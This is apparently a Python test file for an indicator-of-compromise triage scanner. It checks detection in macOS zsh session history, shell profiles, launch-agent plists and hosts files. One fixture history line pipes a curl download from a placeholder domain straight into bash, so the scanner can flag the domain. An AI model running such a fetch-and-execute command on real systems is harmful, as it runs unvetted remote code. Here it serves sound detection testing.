"""macOS shell and launch items: Terminal keeps history per session in
~/.zsh_sessions, shell text names programs inside $( ) and backticks, and a
launch item's program file name is also its process name."""
import os
import plistlib
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from zbtriage.context import ScanContext
from zbtriage.iocs import Indicator, IocSet
from zbtriage.modules import posix


def _ctx(*indicators):
    return ScanContext(IocSet([Indicator(v, "fixture", "primary", t, "fixture") for v, t in indicators],
                              "fixture", None), emit=lambda text: None)


def test_zsh_session_history_is_read(monkeypatch, tmp_path):
    sessions = tmp_path / ".zsh_sessions"
    sessions.mkdir()
    (sessions / "68DC219D.history").write_text('curl -fsSL https://fixture.invalid/x | bash\n')
    (sessions / "68DC219D.session").write_text("echo Restored session\n")
    monkeypatch.setattr(posix, "_ux_roots", lambda: [("unix-shell-history", str(sessions), "history-dir")])
    result = posix.run(_ctx(("fixture.invalid", "domain")))
    assert [(h.indicator, h.evidence) for h in result.hits] == [("fixture.invalid", "referenced")]
    assert "68DC219D.history" in result.hits[0].location
    assert not [c for c in result.checks if not c.ran]


def test_path_inside_command_substitution_matches(monkeypatch, tmp_path):
    profile = tmp_path / ".zprofile"
    profile.write_text('eval "$(/usr/local/bin/fixturetool shellenv)"\nX=`/opt/fixture/bin/other`\n')
    monkeypatch.setattr(posix, "_ux_roots", lambda: [("unix-shell-profiles", str(profile), "shell-file")])
    result = posix.run(_ctx(("/usr/local/bin/fixturetool", "file-path"), ("/opt/fixture/bin/other", "file-path")))
    assert {h.indicator for h in result.hits} == {"/usr/local/bin/fixturetool", "/opt/fixture/bin/other"}


def test_launch_item_program_name_is_a_process_name(monkeypatch, tmp_path):
    (tmp_path / "com.fixture.agent.plist").write_bytes(plistlib.dumps(
        {"Label": "com.fixture.agent", "ProgramArguments": ["/Library/Fixture/fixtured", "--daemon"]}))
    monkeypatch.setattr(posix, "_ux_roots", lambda: [("macos-launch-items", str(tmp_path), "plist")])
    result = posix.run(_ctx(("fixtured", "process"), ("fixture", "process")))
    assert [(h.indicator, h.evidence) for h in result.hits] == [("fixtured", "configured")]


def test_hosts_file_on_macos_and_linux(monkeypatch, tmp_path):
    from zbtriage.modules import host
    hosts = tmp_path / "hosts"
    hosts.write_text("127.0.0.1 localhost\n0.0.0.0 blocked.invalid\n203.0.113.7 fixture.invalid\n")
    for system in ("Darwin", "Linux"):
        monkeypatch.setattr(host.platform, "system", lambda: system)
        monkeypatch.setattr(host, "_hosts_path", lambda: str(hosts))
        result = host.run(_ctx(("fixture.invalid", "domain"), ("blocked.invalid", "domain")))
        assert [(h.indicator, h.evidence) for h in result.hits] == [("fixture.invalid", "configured")]
        assert [c.name for c in result.checks] == ["hosts-file"] and result.checks[0].ran
